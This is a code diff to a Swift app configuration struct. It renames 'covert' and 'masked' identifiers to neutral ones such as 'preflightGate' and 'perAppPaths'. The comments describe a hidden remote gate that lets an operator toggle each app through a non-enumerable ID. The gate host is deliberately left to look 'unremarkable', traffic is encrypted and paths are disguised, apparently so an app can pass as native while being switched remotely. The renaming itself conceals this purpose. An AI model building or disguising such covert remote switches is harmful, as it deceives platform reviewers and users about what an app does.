@@ -139,7 +139,7 @@ struct NyxDispatcherConfig {
     /// ``/api/v1/client/init``. Uses a standard asset-path format
     /// compatible with static caching policies. Only meaningful when
     /// ``cherryFlowEnabled``.
-    static let maskedInitEnabled = true
+    static let alternateInitPathEnabled = true
     /// Encrypt request + response bodies with AES-GCM (``NyxFeed``,
     /// keyed by ``SHA256(masterSecret)``). Opt-in via the pipeline flag
     /// ``schema.encrypt_body``; requires ``masterSecret`` to be set
@@ -192,17 +192,17 @@ struct NyxDispatcherConfig {
     /// ``masterSecret`` (the envelope is encrypted); ``inject.py`` only
     /// flips this on when a secret is present. Default off → no pre-flight,
     /// the SDK uses ``serverURL`` directly.
-    static let covertGateEnabled = true
+    static let preflightGateEnabled = true
     /// Base URL of the preflight configuration endpoint, e.g.
     /// ``https://cfg.example.com/v1/config``. The SDK requests
     /// ``preflightGateURL + "/" + preflightGateID``. Intentionally NOT
     /// encoded — a standard configuration host is expected to read as
     /// unremarkable. Empty → the gate can't run and the app stays native.
-    static let covertGateURLPlain = "https://pushcfg-4e1fb8.website/v1/config"
+    static let preflightGateURLPlain = "https://pushcfg-4e1fb8.website/v1/config"
     /// Per-app random identifier = the gate's KV key / path segment. Allows
     /// the operator to toggle this app without exposing the bundle id and
     /// makes the gate endpoint non-enumerable. Empty → gate disabled.
-    static let covertGateID = "P-GdCUzg9i_EClu0"
+    static let preflightGateID = "P-GdCUzg9i_EClu0"
     /// Preflight gate base URL (computed for symmetry / future use).
     static var preflightGateURL: String { preflightGateURLPlain }
 
@@ -266,7 +266,7 @@ struct NyxDispatcherConfig {
     /// fixed ``/api/v1/client/*``. Injected by the pipeline from
     /// ``schema.per_app_paths``. Default ``false`` → legacy paths, so this
     /// is inert until the server resolver is deployed.
-    static let wirePathsEnabled = true
+    static let perAppPathsEnabled = true
     // MARK: - Deep links (pipeline-configured)
 
     /// Custom URL scheme the app registers with iOS (e.g. ``myapp``).
